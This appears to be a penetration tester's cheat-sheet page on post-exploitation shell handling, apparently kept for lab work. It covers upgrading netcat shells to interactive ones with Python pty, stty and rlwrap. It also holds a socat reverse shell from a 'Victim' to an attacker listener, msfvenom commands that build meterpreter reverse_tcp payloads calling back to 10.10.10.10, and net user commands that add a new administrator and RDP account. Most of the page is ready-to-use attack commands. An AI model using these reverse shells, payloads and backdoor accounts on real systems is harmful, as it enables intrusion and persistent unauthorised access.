Most [netcat](../Tools/netcat.md)-like tools provide a non-interactive shell, which means that programs that require user input such as many file transfer programs or `su` and `sudo` tend to work poorly, if at all. Non-interactive shells also lack useful features like tab completion and job control. It is always a good idea upgrade any non-interactive shell to an interactive one.

# Linux

## Python PTY

```python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## TERM and SHELL exports

```bash
SHELL=/bin/bash script -q /dev/null

^Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

## socat

```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## Fix rows and columns

From a clean terminal:

```bash
┌──(kali㉿kali)-[~/…/lab/ntwk/it.local/10.1.1.1]
└─$ stty -a
speed 38400 baud; rows 60; columns 235; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```

From the "malformed" terminal:

```bash
www-data@luigi:/var/www$ stty rows 60 columns 235
stty rows 60 columns 235
```

---

# Windows:

## Rlwrap [^1]

[^1]: https://github.com/hanslub42/rlwrap](https://github.com/hanslub42/rlwrap

```bash
┌──(kali㉿kali)-[~/…/lab/ntwk/it.local/10.1.1.1]
└─$ rlwrap nc -nlvp 443
```

## meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=10099 -f exe -o meter.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=10099 -f exe -o meter.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=10099 -f exe -o meter-x64.exe
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=10099 -f exe -o meter-x64.exe
```

## RDP

```powershell
net user maoutis Qwerty123! /add
net localgroup Administrators maoutis /add
net localgroup "Remote Desktop Users" maoutis /ADD
```